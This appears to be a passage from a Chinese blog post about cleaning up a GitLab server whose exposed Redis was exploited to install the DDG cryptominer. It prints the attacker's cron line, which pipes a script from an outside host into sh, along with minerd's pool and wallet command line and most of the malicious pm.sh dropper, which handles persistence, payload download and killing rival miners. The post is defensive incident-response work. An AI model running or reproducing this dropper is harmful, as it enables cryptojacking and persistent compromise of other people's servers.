/home/git/gitlab/log/production.log&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:26 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:31 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:37 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:42 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:15:35 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started GET &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 177.154.56.233 at 2017-01-06 10:15:55 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Processing by DashboardController&lt;span class=&quot;comment&quot;&gt;#show as */*&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Completed 401 Unauthorized &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 55ms&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Redis::CommandError (NOAUTH Authentication required.):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  config/initializers/redis-store-fix-expiry.rb:10:&lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; `block &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; setex&lt;span class=&quot;string&quot;&gt;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  config/initializers/redis-store-fix-expiry.rb:10:in `setter’&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里提示Redis需要认证，&lt;code&gt;Redis::CommandError (NOAUTH Authentication required.)&lt;/code&gt;:这里当初就没有认证的，突然需要认证，明显被人黑了。&lt;/p&gt;
&lt;p&gt;因为redis服务在2016年3月份官网发布了一项通知：使用redis主要设置密码。&lt;br&gt;可以看下这篇文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.oschina.net/news/67975/redis-defect?from=mail-notify&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Redis 未授权访问缺陷可轻易导致系统被黑&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;全球无验证可直接利用 Redis TOP 10 国家与地区&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://static.oschina.net/uploads/space/2015/1112/131046_hoNL_865233.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;解决方案&lt;/p&gt;
&lt;figure class=&quot;highlight mipsasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;临时解决方案                            &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;配置&lt;span class=&quot;keyword&quot;&gt;bind选项, &lt;/span&gt;限定可以连接Redis服务器的IP, 并修改redis的默认端口&lt;span class=&quot;number&quot;&gt;6379&lt;/span&gt;.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;配置AUTH, 设置密码, 密码会以明文方式保存在redis配置文件中.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;配置rename-command &lt;span class=&quot;built_in&quot;&gt;CONFIG&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;RENAME_CONFIG&quot;&lt;/span&gt;, 这样即使存在未授权访问, 也能够给攻击者使用&lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt;指令加大难度&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如&lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;官方解决方案                            &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;暂无官方解决方案&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在版本gitlab 7.0版本的没有redis设置密码一项，所以就觉得奇怪，为什么会有人设置了密码，网站导致获取不到数据就出现500了。&lt;/p&gt;
&lt;h4 id=&quot;查找原因：什么原因导致CPU一直100&quot;&gt;&lt;a href=&quot;#查找原因：什么原因导致CPU一直100&quot; class=&quot;headerlink&quot; title=&quot;查找原因：什么原因导致CPU一直100%&quot;&gt;&lt;/a&gt;查找原因：什么原因导致CPU一直100%&lt;/h4&gt;&lt;p&gt;首先SSH登陆，top查看进程，发现奇怪名字的命令AnXqV, ddg.217隐藏进程。 还有一看就感觉有问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;知道这个进程然后我们单独看下这个进程具体有哪些：&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_04.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;lsof –c ddg.217&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查看关联文件，发现对外的tcp连接，不知道是不是反向shell…&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_05.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;从这里明显可以看的出来，我的redis-6379 被人拿到shell权限了。&lt;/p&gt;
&lt;p&gt;从上面可以看到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_06.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里我到/root/.ddg/17.db这个文件我打开看是乱码加密过的。&lt;br&gt;加密的 看不到数据。&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_07.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h6 id=&quot;这里第一步删除第一个病毒文件和加权限位：&quot;&gt;&lt;a href=&quot;#这里第一步删除第一个病毒文件和加权限位：&quot; class=&quot;headerlink&quot; title=&quot;这里第一步删除第一个病毒文件和加权限位：&quot;&gt;&lt;/a&gt;这里第一步删除第一个病毒文件和加权限位：&lt;/h6&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;rm -rf /root/.ddg  删除依赖。他依赖于哪个文件，然后给加一个权限位：chattr  +s  filename&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;删除掉了 你手动创建，然后加权限位。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&quot;第二步分析下面IP地址：&quot;&gt;&lt;a href=&quot;#第二步分析下面IP地址：&quot; class=&quot;headerlink&quot; title=&quot;第二步分析下面IP地址：&quot;&gt;&lt;/a&gt;第二步分析下面IP地址：&lt;/h6&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;139.222.173.127&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;139.70.199.90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;后面就不用解释了，这个明显当`肉鸡`了。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_08.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;临时方法防火墙配置屏蔽这些IP地址。 治标不治本、&lt;/p&gt;
&lt;p&gt;这里解决掉&lt;code&gt;12506&lt;/code&gt;进程：kill -9 12506&lt;/p&gt;
&lt;p&gt;配置 一个hosts  &lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;10.0.1.110   www.haveabitchin.com  配置成 百度的ip&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;帮他配错地址,他肯定请求下载 不到这个脚本了.&lt;/p&gt;
&lt;p&gt;然后按进程程序目录下面进入/tmp/删除 ddg.217文件，删除duchduckgo.17.log 这个是病毒运行进程输出的日志文件，&lt;br&gt;删除hsperfadata_root 这个文件里面是个进程，也删除。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_09.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后在看看是否还有没有这个进程：&lt;br&gt;又启动&lt;code&gt;13929&lt;/code&gt;这个进程，服务还是占用很高资源CPU：100%&lt;br&gt;定位到是哪个程序 发起的请求.查看：&lt;code&gt;13918&lt;/code&gt;这个进程：&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;从这里明显可以看出来，这个地址：&lt;/p&gt;
&lt;figure class=&quot;highlight groovy&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/bin/&lt;/span&gt;sh -c curl -fsSL &lt;span class=&quot;string&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//www.haveabitchin.com/pm.sh?0105008 | sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;curl -fsSL &lt;span class=&quot;string&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个明显是哪个程序一直在启动。&lt;/p&gt;
&lt;h5 id=&quot;第三步继续排查：&quot;&gt;&lt;a href=&quot;#第三步继续排查：&quot; class=&quot;headerlink&quot; title=&quot;第三步继续排查：&quot;&gt;&lt;/a&gt;第三步继续排查：&lt;/h5&gt;&lt;p&gt;删除这些发现还是CPU百分百：&lt;br&gt;在继续查看进程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root     26373     1 96 Jan01 ?        4-12:14:03 ./minerd -B &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个进程是什么：mined 百度告诉我们了: &lt;a href=&quot;https://zhidao.baidu.com/question/1928020622935195267.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;mined肉鸡木马&lt;/a&gt; 很吃CPU一种病毒。&lt;/p&gt;
&lt;h5 id=&quot;第一步解决定位木马：&quot;&gt;&lt;a href=&quot;#第一步解决定位木马：&quot; class=&quot;headerlink&quot; title=&quot;第一步解决定位木马：&quot;&gt;&lt;/a&gt;第一步解决定位木马：&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;find / -name minerd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在服务器搜索所有相关minerd文件。&lt;br&gt;搜索到了这个文件放在我们/home/目录下面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h5 id=&quot;第二步删除木马：&quot;&gt;&lt;a href=&quot;#第二步删除木马：&quot; class=&quot;headerlink&quot; title=&quot;第二步删除木马：&quot;&gt;&lt;/a&gt;第二步删除木马：&lt;/h5&gt;&lt;p&gt;查看计划任务是否有启动：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@GitLab tmp]&lt;span class=&quot;comment&quot;&gt;# cronte -e&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&quot;服务器恢复正常：&quot;&gt;&lt;a href=&quot;#服务器恢复正常：&quot; class=&quot;headerlink&quot; title=&quot;服务器恢复正常：&quot;&gt;&lt;/a&gt;服务器恢复正常：&lt;/h5&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_14.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我这里就贴出了这个木马的脚本内容：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; PATH=&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:/bin:/usr/bin:/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin:/usr/sbin&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /var/spool/cron/crontabs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/crontabs/root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/ddg.217&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chmod +x /tmp/ddg.217 &amp;amp;&amp;amp; /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;killall /tmp/ddg.216&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/opt/yam&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    rm -rf /opt/yam&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep /tmp/duckduckgo|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/usr/bin/cron&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/opt/cron&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;▽&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/usr/sbin/ntp&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/opt/minerd&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;mine.moneropool.com&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;xmr.crypto-pool.fr:8080&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#/opt/minerd -h&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#if [ $? != &quot;0&quot; ]; then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#ps auxf|grep -v grep|grep &quot;/opt/minerd&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#if [ $? != &quot;0&quot; ]; then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#if [ ! -f /opt/yam ]; then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;#curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        